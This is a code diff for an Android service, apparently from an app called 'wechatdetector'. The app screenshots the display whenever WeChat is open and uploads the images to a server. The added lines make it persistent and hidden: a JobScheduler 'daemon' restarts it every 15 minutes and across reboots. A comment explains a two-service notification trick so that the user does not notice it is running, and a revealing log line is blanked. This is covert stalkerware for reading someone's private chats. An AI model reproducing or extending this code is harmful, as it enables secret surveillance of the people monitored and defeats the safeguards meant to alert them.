@@ -1,8 +1,16 @@
-package com.zou.wechatdetector.activity;
+package com.zou.wechatdetector.service;
 
 import android.app.Activity;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
+import android.app.job.JobInfo;
+import android.app.job.JobScheduler;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
+import android.content.ServiceConnection;
 import android.graphics.Bitmap;
 import android.graphics.PixelFormat;
 import android.hardware.display.DisplayManager;
@@ -11,13 +19,14 @@ import android.media.Image;
 import android.media.ImageReader;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
+import android.os.Build;
 import android.os.IBinder;
 import android.os.SystemClock;
 import android.support.annotation.Nullable;
 import android.util.DisplayMetrics;
 import android.util.Log;
-import android.widget.Toast;
 
+import com.zou.wechatdetector.R;
 import com.zou.wechatdetector.bean.GsonUploadFileResultBean;
 import com.zou.wechatdetector.utils.Constants;
 import com.zou.wechatdetector.utils.Tools;
@@ -59,6 +68,8 @@ public class MainService extends Service {
     private MediaProjectionManager projectionManager;
     private MediaProjection mediaProjection;
     private Upload uploadService;
+
+    private InnerServiceConnection mConnection;
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
@@ -67,13 +78,32 @@ public class MainService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-
-        return super.onStartCommand(intent, flags, startId);
+        //启动守护进程
+        JobScheduler jobScheduler = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
+        jobScheduler.cancelAll();
+        JobInfo.Builder builder = new JobInfo.Builder(1024, new ComponentName(getPackageName(), JobProtectService.class.getName()));
+        builder.setPeriodic(15*60*1000);
+        builder.setPersisted(true);
+        builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
+        int schedule = jobScheduler.schedule(builder.build());
+        if (schedule <= 0) {
+            Log.w(TAG, "schedule error！");
+        }
+        return Service.START_STICKY;
+//        return super.onStartCommand(intent,flags,startId);
     }
 
     @Override
     public void onCreate() {
         super.onCreate();
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
+            startForeground(1,getNotification());
+        }else {
+            if (mConnection == null) {
+                mConnection = new InnerServiceConnection();
+            }
+            this.bindService(new Intent(this, InnerService.class), mConnection, Service.BIND_AUTO_CREATE);
+        }
         EventBus.getDefault().register(this);
         initData();
         detectorThread = new Thread(){
@@ -86,7 +116,7 @@ public class MainService extends Service {
                         e.printStackTrace();
                     }
                     String foregroundApp = Tools.getTopAppPackageName(MainService.this);
-                    Log.i(TAG,foregroundApp);
+                    Log.i(TAG,"alive...");
                     if(foregroundApp.equals("com.tencent.mm")) {
                         Log.i(TAG,"captureScreen");
                         createVirtualDisplay();
@@ -121,6 +151,9 @@ public class MainService extends Service {
     public void onDestroy() {
         super.onDestroy();
         EventBus.getDefault().unregister(this);
+        if(mConnection!=null) {
+            this.unbindService(mConnection);
+        }
     }
 
     private void createVirtualDisplay(){
@@ -215,4 +248,51 @@ public class MainService extends Service {
         @POST("upload")
         Observable<GsonUploadFileResultBean> uploadFile(@Part List<MultipartBody.Part> partList);
     }
+
+    private class InnerServiceConnection implements ServiceConnection {
+        @Override
+        public void onServiceDisconnected(ComponentName name) {
+            Log.d(TAG, "MyService: onServiceDisconnected");
+        }
+
+        @Override
+        public void onServiceConnected(ComponentName name, IBinder binder) {
+            Log.d(TAG, "MyService: onServiceConnected");
+
+            // sdk >=18
+            // 的，会在通知栏显示service正在运行，这里不要让用户感知，所以这里的实现方式是利用2个同进程的service，利用相同的notificationID，
+            // 2个service分别startForeground，然后只在1个service里stopForeground，这样即可去掉通知栏的显示
+            Service innerService = ((InnerService.LocalBinder) binder)
+                    .getService();
+            MainService.this.startForeground(1, getNotification());
+            innerService.startForeground(1, getNotification());
+            innerService.stopForeground(true);
+            MainService.this.unbindService(mConnection);
+            mConnection = null;
+        }
+    }
+
+    private Notification  getNotification(){
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel("channel_id", "name", NotificationManager.IMPORTANCE_DEFAULT);
+
+            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
+
+            Notification notification = new Notification.Builder(this, "channel_id")
+                    .setOngoing(true)
+                    .setSmallIcon(R.drawable.ic_stat_name)
+                    .build();
+            return notification;
+        }else{
+            Notification notification = new Notification(R.drawable.ic_stat_name,"",0);
+            startForeground(1, notification);
+            return notification;
+        }
+    }
+
+
 }
